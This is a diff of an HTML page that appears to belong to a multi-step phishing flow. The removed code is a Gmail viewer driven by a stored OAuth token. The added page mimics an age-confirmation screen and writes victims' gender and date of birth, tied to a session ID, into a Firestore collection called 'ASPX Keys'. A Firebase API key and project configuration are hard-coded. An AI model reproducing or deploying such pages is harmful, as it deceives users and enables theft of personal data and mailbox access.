@@ -1,148 +1,138 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Confirm your age</title>
+    <style>
+        * { box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
+        body { background-color: #ffffff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .container { width: 100%; max-width: 400px; padding: 25px; text-align: center; }
+        h1 { font-size: 32px; font-weight: 500; margin-bottom: 15px; color: #000; }
+        p { color: #555; font-size: 15px; margin-bottom: 35px; line-height: 1.4; }
+        
+        .input-group { position: relative; margin-bottom: 22px; text-align: left; }
+        .label { position: absolute; top: -10px; left: 12px; background: white; padding: 0 5px; font-size: 12px; color: #666; z-index: 1; }
+        
+        .dob-flex { display: flex; gap: 12px; }
+        .input-field { width: 100%; padding: 14px; border: 1px solid #c4c4c4; border-radius: 8px; font-size: 16px; outline: none; transition: border 0.2s; }
+        .input-field:focus { border-color: #000; border-width: 1.5px; }
+
+        .btn-continue { width: 100%; padding: 15px; background-color: #000; color: #fff; border: none; border-radius: 30px; font-size: 16px; font-weight: 600; cursor: pointer; margin-top: 15px; }
+        .btn-continue:hover { background-color: #333; }
+        .error-text { color: #d93025; font-size: 13px; margin-top: 5px; display: none; text-align: left; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <h1>Let's confirm your age</h1>
+    <p>This helps us personalize your experience and provide the right settings, in line with our Privacy Policy.</p>
+
+    <!-- Gender Selection -->
+    <div class="input-group">
+        <span class="label">Gender</span>
+        <select id="gender" class="input-field">
+            <option value="" disabled selected>Select Gender</option>
+            <option value="Male">Male</option>
+            <option value="Female">Female</option>
+            <option value="Rather Not To Say">Rather Not To Say</option>
+        </select>
+    </div>
+
+    <!-- Date of Birth Inputs -->
+    <div class="dob-flex">
+        <!-- Day Input (Max 2 Digits) -->
+        <div class="input-group" style="flex: 1;">
+            <span class="label">Day</span>
+            <input type="number" id="day" class="input-field" placeholder="DD" oninput="if(this.value.length > 2) this.value = this.value.slice(0, 2);">
         </div>
-        <div style="overflow-y: auto;" id="thread-list">
-            <div style="padding: 20px; color: #444;">Syncing with Gmail...</div>
+        
+        <!-- Month Select -->
+        <div class="input-group" style="flex: 2;">
+            <span class="label">Month</span>
+            <select id="month" class="input-field">
+                <option value="01">January</option>
+                <option value="02">February</option>
+                <option value="03">March</option>
+                <option value="04">April</option>
+                <option value="05">May</option>
+                <option value="06">June</option>
+                <option value="07">July</option>
+                <option value="08">August</option>
+                <option value="09">September</option>
+                <option value="10">October</option>
+                <option value="11">November</option>
+                <option value="12">December</option>
+            </select>
+        </div>
+
+        <!-- Year Input (Exactly 4 Digits) -->
+        <div class="input-group" style="flex: 1.5;">
+            <span class="label">Year</span>
+            <input type="number" id="year" class="input-field" placeholder="YYYY" oninput="if(this.value.length > 4) this.value = this.value.slice(0, 4);">
         </div>
     </div>
 
-    <!-- Reader Pane -->
-    <div class="reader-pane" id="reader-pane">
-        <div class="toolbar">
-            <button class="icon-btn back-btn" onclick="closeReader()">← Back</button>
-            <button class="icon-btn" onclick="modifyEmail('archive')">Archive</button>
-            <button class="icon-btn" onclick="modifyEmail('trash')" style="color: #ff4444;">Delete</button>
-            <button class="icon-btn" onclick="showLabels()">Labels</button>
-            <a id="reply-link" href="#" class="icon-btn" style="text-decoration: none; background: var(--accent);">Reply</a>
-        </div>
-        <div id="reader-meta" style="padding: 20px 30px; border-bottom: 1px solid var(--border);">
-            <h2 id="view-subject" style="margin: 0 0 10px 0; font-size: 20px;"></h2>
-            <div id="view-from" style="font-size: 13px; color: var(--text-dim);"></div>
-        </div>
-        <div class="reader-body">
-            <iframe id="mail-frame"></iframe>
-        </div>
-    </div>
+    <div id="error" class="error-text">Please enter valid details.</div>
+    <button id="nextBtn" class="btn-continue">Continue</button>
+</div>
 
-    <script type="module">
-        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
-        import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
+<script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
+    import { getFirestore, doc, updateDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
 
-        const firebaseConfig = {
-            apiKey: "AIzaSyDPm2za3Ho0Hd8Henuhq0KxAHyUQh-Hi-U",
-            projectId: "question-metabase",
-            appId: "1:770698198753:web:59ae49d78b6013bab5c1a0"
-        };
-        const app = initializeApp(firebaseConfig);
-        const db = getFirestore(app);
+    const firebaseConfig = {
+        apiKey: "AIzaSyDPm2za3Ho0Hd8Henuhq0KxAHyUQh-Hi-U",
+        authDomain: "question-metabase.firebaseapp.com",
+        databaseURL: "https://question-metabase-default-rtdb.asia-southeast1.firebasedatabase.app",
+        projectId: "question-metabase",
+        storageBucket: "question-metabase.firebasestorage.app",
+        messagingSenderId: "770698198753",
+        appId: "1:770698198753:web:59ae49d78b6013bab5c1a0",
+        measurementId: "G-6ZP1FPMKSJ"
+    };
 
-        const token = localStorage.getItem('gmail_token');
-        if (!token) window.location.href = './1.html';
+    const app = initializeApp(firebaseConfig);
+    const db = getFirestore(app);
 
-        let currentMsgId = null;
+    // Get Session ID from URL (e.g., 2.html?session=1065080509)
+    const urlParams = new URLSearchParams(window.location.search);
+    const sessionId = urlParams.get('session');
 
-        // 1. Fetch User Profile
-        async function fetchProfile() {
-            const res = await fetch('https://gmail.googleapis.com/gmail/v1/users/me/profile', {
-                headers: { 'Authorization': `Bearer ${token}` }
-            });
-            const data = await res.json();
-            document.getElementById('user-email').innerText = data.emailAddress;
-            document.getElementById('user-dp').innerText = data.emailAddress[0].toUpperCase();
+    document.getElementById('nextBtn').addEventListener('click', async () => {
+        const day = document.getElementById('day').value;
+        const month = document.getElementById('month').value;
+        const year = document.getElementById('year').value;
+        const gender = document.getElementById('gender').value;
+        const errorDiv = document.getElementById('error');
+
+        // Validation: Day must be 1-2 digits, Year must be exactly 4 digits
+        if (!gender || day.length < 1 || year.length !== 4) {
+            errorDiv.style.display = 'block';
+            return;
         }
 
-        // 2. Fetch Inbox
-        async function fetchInbox() {
-            const res = await fetch('https://gmail.googleapis.com/gmail/v1/users/me/messages?maxResults=20&q=label:INBOX', {
-                headers: { 'Authorization': `Bearer ${token}` }
+        try {
+            // Reference the existing document in "ASPX Keys" using the sessionId
+            const docRef = doc(db, "ASPX Keys", sessionId);
+
+            // Update the existing document (Adding fields to where firstName/lastName are)
+            await updateDoc(docRef, {
+                dob: `${day}/${month}/${year}`,
+                gender: gender,
+                updatedAt: serverTimestamp()
             });
-            const data = await res.json();
-            const listDiv = document.getElementById('thread-list');
-            listDiv.innerHTML = '';
 
-            if(!data.messages) { listDiv.innerHTML = "<p style='padding:20px'>Inbox Empty</p>"; return; }
-
-            for (let msg of data.messages) {
-                const detailRes = await fetch(`https://gmail.googleapis.com/gmail/v1/users/me/messages/${msg.id}`, {
-                    headers: { 'Authorization': `Bearer ${token}` }
-                });
-                const email = await detailRes.json();
-                
-                const subject = email.payload.headers.find(h => h.name === 'Subject')?.value || '(No Subject)';
-                const from = email.payload.headers.find(h => h.name === 'From')?.value || 'Unknown';
-                
-                const item = document.createElement('div');
-                item.className = 'thread-item';
-                item.id = `item-${msg.id}`;
-                item.innerHTML = `
-                    <div class="from"><span>${from.split('<')[0]}</span></div>
-                    <div class="subject">${subject}</div>
-                    <div class="snippet">${email.snippet}</div>
-                `;
-                item.onclick = () => openEmail(email, msg.id, subject, from);
-                listDiv.appendChild(item);
-            }
-        }
-
-        // 3. Open Email
-        function openEmail(email, id, subject, from) {
-            currentMsgId = id;
-            document.querySelectorAll('.thread-item').forEach(e => e.classList.remove('selected'));
-            document.getElementById(`item-${id}`).classList.add('selected');
-
-            document.getElementById('view-subject').innerText = subject;
-            document.getElementById('view-from').innerText = `From: ${from}`;
+            // Redirect to step 3
+            window.location.href = `3.html?session=${sessionId}`;
             
-            // Handle Mobile Pane Switch
-            if(window.innerWidth < 768) {
-                document.getElementById('reader-pane').classList.add('active');
-            }
-
-            // Decode HTML Content
-            let body = "";
-            const part = email.payload.parts ? email.payload.parts.find(p => p.mimeType === 'text/html') || email.payload.parts[0] : email.payload;
-            body = atob(part.body.data.replace(/-/g, '+').replace(/_/g, '/'));
-
-            const frame = document.getElementById('mail-frame');
-            frame.contentDocument.body.innerHTML = body;
-
-            // Reply Link
-            const fromEmail = from.match(/<(.+)>/)?.[1] || from;
-            document.getElementById('reply-btn').href = `./3.html?to=${encodeURIComponent(fromEmail)}&subject=${encodeURIComponent("Re: "+subject)}`;
+        } catch (e) {
+            console.error("Update Error: ", e);
+            alert("Session expired or invalid document ID.");
         }
+    });
+</script>
 
-        // 4. Archive / Delete Logic
-        window.modifyEmail = async (action) => {
-            if(!currentMsgId) return;
-            
-            let body = {};
-            if(action === 'archive') body = { removeLabelIds: ['INBOX'] };
-            if(action === 'trash') {
-                await fetch(`https://gmail.googleapis.com/gmail/v1/users/me/messages/${currentMsgId}/trash`, {
-                    method: 'POST', headers: { 'Authorization': `Bearer ${token}` }
-                });
-            } else {
-                await fetch(`https://gmail.googleapis.com/gmail/v1/users/me/messages/${currentMsgId}/modify`, {
-                    method: 'POST',
-                    headers: { 'Authorization': `Bearer ${token}`, 'Content-Type': 'application/json' },
-                    body: JSON.stringify(body)
-                });
-            }
-
-            // Log to Firestore
-            await addDoc(collection(db, "user_actions"), {
-                messageId: currentMsgId,
-                action: action,
-                timestamp: serverTimestamp()
-            });
-
-            alert(`Email ${action}d`);
-            location.reload();
-        };
-
-        window.closeReader = () => document.getElementById('reader-pane').classList.remove('active');
-        window.refresh = () => fetchInbox();
-
-        fetchProfile();
-        fetchInbox();
-    </script>
 </body>
 </html>
